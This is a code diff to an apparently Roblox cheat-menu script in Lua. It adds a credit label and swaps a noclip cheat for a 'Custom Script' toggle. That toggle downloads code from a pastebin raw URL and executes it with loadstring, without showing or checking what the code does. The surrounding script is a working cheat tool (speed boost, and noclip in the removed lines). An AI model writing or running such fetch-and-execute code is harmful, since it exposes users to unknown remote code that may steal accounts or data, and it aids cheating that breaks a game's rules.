@@ -78,6 +78,19 @@ contentFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 contentFrame.BorderSizePixel = 0
 contentFrame.Parent = mainFrame
 
+-- Credit Label
+local creditLabel = Instance.new("TextLabel")
+creditLabel.Name = "Credit"
+creditLabel.Size = UDim2.new(0, 100, 0, 20)
+creditLabel.Position = UDim2.new(0, 5, 1, -25)
+creditLabel.BackgroundTransparency = 1
+creditLabel.Text = "By: @P_G_B"
+creditLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+creditLabel.TextScaled = true
+creditLabel.Font = Enum.Font.Gotham
+creditLabel.TextXAlignment = Enum.TextXAlignment.Left
+creditLabel.Parent = contentFrame
+
 -- Walkspeed functionality
 local walkspeedEnabled = false
 local walkspeedConnection = nil
@@ -115,48 +128,43 @@ local function toggleWalkspeed()
     return walkspeedEnabled
 end
 
--- Noclip functionality
-local noclipEnabled = false
-local noclipConnection = nil
+-- Custom Script functionality
+local customScriptEnabled = false
+local customScriptInstance = nil
 
-local function updateNoclip()
-    if player.Character then
-        for _, part in pairs(player.Character:GetChildren()) do
-            if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
-                part.CanCollide = not noclipEnabled
-            end
-        end
-    end
-end
-
-local function toggleNoclip()
-    noclipEnabled = not noclipEnabled
+local function toggleCustomScript()
+    customScriptEnabled = not customScriptEnabled
     
-    if noclipEnabled then
-        -- Start the noclip update loop
-        noclipConnection = RunService.Heartbeat:Connect(function()
-            wait(0.1)
-            updateNoclip()
+    if customScriptEnabled then
+        -- Execute the custom script
+        local success, result = pcall(function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/piukyETa"))()
         end)
-    else
-        -- Stop the noclip update loop
-        if noclipConnection then
-            noclipConnection:Disconnect()
-            noclipConnection = nil
+        
+        if success then
+            customScriptInstance = result
+        else
+            warn("Failed to load custom script: " .. tostring(result))
+            customScriptEnabled = false
         end
-        updateNoclip() -- Reset to default
+    else
+        -- Turn off the custom script (callback functionality)
+        if customScriptInstance and typeof(customScriptInstance) == "table" and customScriptInstance.Destroy then
+            customScriptInstance:Destroy()
+        end
+        customScriptInstance = nil
     end
     
-    return noclipEnabled
+    return customScriptEnabled
 end
 
--- Button configurations (removed buttons 5, 6, 7)
+-- Button configurations
 local buttonConfigs = {
     {name = "Speed Boost", color = Color3.fromRGB(50, 50, 50), isToggle = true, action = function()
         return toggleWalkspeed()
     end},
-    {name = "Noclip", color = Color3.fromRGB(45, 45, 45), isToggle = true, action = function()
-        return toggleNoclip()
+    {name = "Custom Script", color = Color3.fromRGB(45, 45, 45), isToggle = true, action = function()
+        return toggleCustomScript()
     end},
     {name = "Walk Speed", color = Color3.fromRGB(40, 40, 40), isSlider = true, min = 16, max = 100, action = function(value)
         -- Function removed
